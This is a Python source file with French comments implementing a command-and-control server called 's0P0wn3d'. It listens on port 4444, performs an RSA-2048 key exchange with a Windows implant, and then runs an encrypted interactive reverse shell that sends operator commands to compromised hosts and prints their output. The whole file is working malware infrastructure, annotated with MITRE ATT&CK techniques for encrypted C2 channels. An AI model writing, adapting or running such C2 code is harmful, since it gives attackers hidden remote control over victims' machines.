#!/usr/bin/env python3
"""
s0P0wn3d — C2 Server  (Phase 2 : RSA-2048 + AES-256-CBC)

Protocole de handshake (une fois par connexion) :
  SERVER → CLIENT  [4B big-endian : blob_len]  [blob : BCRYPT_RSAPUBLIC_BLOB]
  CLIENT → SERVER  [4B big-endian : enc_len]   [enc  : RSA-OAEP-SHA256(32-byte AES session key)]

Frames de données (commandes / réponses) :
  ÉMETTEUR → RÉCEPTEUR
    [4B big-endian : total_len = 16 + len(ciphertext)]
    [16B           : IV aléatoire]
    [?B            : AES-256-CBC / PKCS#7]

Chaque connexion dispose d'une SESSION_KEY unique.
La clé RSA est générée au démarrage du serveur (une seule paire par run).

Dépendances Python : pip install cryptography

MITRE ATT&CK :
  T1090       - Proxy (canal C2)
  T1573       - Encrypted Channel
  T1573.002   - Asymmetric Cryptography (échange de clé RSA)
"""

import os
import socket
import struct
import threading
import sys

from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding as sym_padding

HOST = "0.0.0.0"
PORT = 4444

# ── Paire RSA (générée une seule fois au démarrage du serveur) ────────────────

_rsa_private_key = None
_rsa_public_blob = None   # BCRYPT_RSAPUBLIC_BLOB prêt à être envoyé au client C


def _generate_rsa_keys() -> None:
    """Génère une paire RSA-2048 et pré-calcule le blob BCrypt."""
    global _rsa_private_key, _rsa_public_blob
    print("[*] Génération de la paire RSA-2048 ...", end=" ", flush=True)
    _rsa_private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    _rsa_public_blob = _build_bcrypt_rsapublic_blob(_rsa_private_key.public_key())
    print(f"OK ({len(_rsa_public_blob)} octets)")


def _build_bcrypt_rsapublic_blob(public_key) -> bytes:
    """
    Construit un BCRYPT_RSAPUBLIC_BLOB compatible avec BCryptImportKeyPair
    côté implant Windows.

    Format (entiers en little-endian) :
        ULONG Magic       = 0x31415352  ("RSA1")
        ULONG BitLength   = 2048
        ULONG cbPublicExp = len(e_bytes)
        ULONG cbModulus   = len(n_bytes)
        ULONG cbPrime1    = 0
        ULONG cbPrime2    = 0
        BYTE[cbPublicExp] exposant public (big-endian)
        BYTE[cbModulus]   modulus (big-endian)
    """
    pub_numbers = public_key.public_numbers()
    e = pub_numbers.e
    n = pub_numbers.n

    e_bytes = e.to_bytes((e.bit_length() + 7) // 8, "big")
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, "big")

    BCRYPT_RSAPUBLIC_MAGIC = 0x31415352   # "RSA1" little-endian
    header = struct.pack(
        "<IIIIII",
        BCRYPT_RSAPUBLIC_MAGIC,
        len(n_bytes) * 8,   # BitLength
        len(e_bytes),        # cbPublicExp
        len(n_bytes),        # cbModulus
        0,                   # cbPrime1 (0 pour une clé publique)
        0,                   # cbPrime2 (0 pour une clé publique)
    )
    return header + e_bytes + n_bytes


def _rsa_decrypt_session_key(enc_key: bytes) -> bytes:
    """
    Déchiffre la SESSION_KEY AES envoyée par l'implant.

    L'implant utilise BCryptEncrypt avec :
      BCRYPT_OAEP_PADDING_INFO { BCRYPT_SHA256_ALGORITHM, NULL, 0 }
    Ce qui correspond côté Python à OAEP(MGF1(SHA256), SHA256).
    """
    return _rsa_private_key.decrypt(
        enc_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


# ── Helpers réseau ────────────────────────────────────────────────────────────

def _recv_all(conn: socket.socket, n: int) -> bytes:
    """Lit exactement n octets depuis la socket (bloquant)."""
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connexion fermée par le pair")
        buf += chunk
    return buf


def send_enc(conn: socket.socket, data: bytes, aes_key: bytes) -> None:
    """
    Chiffre data avec AES-256-CBC (PKCS#7) et l'envoie dans un frame :
      [4B big-endian : total_len]  [16B : IV aléatoire]  [ciphertext]
    """
    # Padding PKCS#7 vers un multiple de 16 octets
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    enc = cipher.encryptor()
    ciphertext = enc.update(padded) + enc.finalize()

    total_len = 16 + len(ciphertext)
    conn.sendall(struct.pack(">I", total_len) + iv + ciphertext)


def recv_dec(conn: socket.socket, aes_key: bytes) -> bytes:
    """
    Reçoit un frame AES-256-CBC et retourne les données déchiffrées.
    Lève ConnectionError si la connexion est fermée.
    """
    hdr = _recv_all(conn, 4)
    total_len = struct.unpack(">I", hdr)[0]
    if total_len <= 16 or total_len > 65536:
        raise ValueError(f"Taille de frame invalide : {total_len}")

    payload = _recv_all(conn, total_len)
    iv, ciphertext = payload[:16], payload[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    dec = cipher.decryptor()
    padded = dec.update(ciphertext) + dec.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


# ── Handshake RSA ─────────────────────────────────────────────────────────────

def rsa_handshake(conn: socket.socket) -> bytes:
    """
    Exécute le handshake RSA et retourne la SESSION_KEY AES-256 (32 octets).

    1. Envoie le blob de clé publique RSA au format BCRYPT_RSAPUBLIC_BLOB.
    2. Reçoit la SESSION_KEY chiffrée par l'implant avec RSA-OAEP-SHA256.
    3. Déchiffre et retourne la SESSION_KEY.
    """
    # Étape 1 : envoyer la clé publique RSA
    blob = _rsa_public_blob
    conn.sendall(struct.pack(">I", len(blob)) + blob)

    # Étape 2 : recevoir la SESSION_KEY chiffrée
    hdr = _recv_all(conn, 4)
    enc_len = struct.unpack(">I", hdr)[0]
    if enc_len <= 0 or enc_len > 1024:
        raise ValueError(f"Longueur de clé chiffrée invalide : {enc_len}")

    enc_key = _recv_all(conn, enc_len)

    # Étape 3 : déchiffrer
    session_key = _rsa_decrypt_session_key(enc_key)
    if len(session_key) != 32:
        raise ValueError(f"SESSION_KEY inattendue : {len(session_key)} octets")

    return session_key


# ── Gestionnaire de session ───────────────────────────────────────────────────

def handle_session(conn: socket.socket, addr: tuple) -> None:
    """Gère une session reverse-shell complète."""
    print(f"\n[+] Connexion de {addr[0]}:{addr[1]}")

    try:
        # Phase 1 : handshake RSA → obtenir la SESSION_KEY
        session_key = rsa_handshake(conn)
        print(f"[+] Handshake RSA OK — session_key: {session_key.hex()[:16]}…")
        print("[+] Shell interactif — \'exit\' pour fermer\n")

        while True:
            try:
                cmd = input(f"[{addr[0]}]> ").strip()
            except EOFError:
                break

            if not cmd:
                continue
            if cmd.lower() == "exit":
                break

            # Envoyer la commande chiffrée
            send_enc(conn, (cmd + "\r\n").encode("utf-8"), session_key)

            # Recevoir la réponse chiffrée
            try:
                response = recv_dec(conn, session_key)
                print(response.decode("utf-8", errors="ignore"), end="")
            except Exception as exc:
                print(f"[-] Erreur réception : {exc}")
                break

    except (ConnectionResetError, BrokenPipeError, ConnectionError) as exc:
        print(f"\n[-] Connexion perdue ({addr[0]}) : {exc}")
    except KeyboardInterrupt:
        print("\n[!] Session fermée par l'opérateur")
    except Exception as exc:
        print(f"\n[-] Erreur : {exc}")
    finally:
        conn.close()


# ── Serveur principal ─────────────────────────────────────────────────────────

def main() -> None:
    _generate_rsa_keys()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    print(f"""
 ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗
██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝     ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

[*] C2 Server Phase 2 — RSA-2048 + AES-256-CBC
[*] Écoute sur {HOST}:{PORT}
[*] En attente de connexions...
""")

    try:
        while True:
            conn, addr = server.accept()
            t = threading.Thread(
                target=handle_session, args=(conn, addr), daemon=True
            )
            t.start()
    except KeyboardInterrupt:
        print("\n[!] Serveur C2 arrêté")
        server.close()


if __name__ == "__main__":
    main()
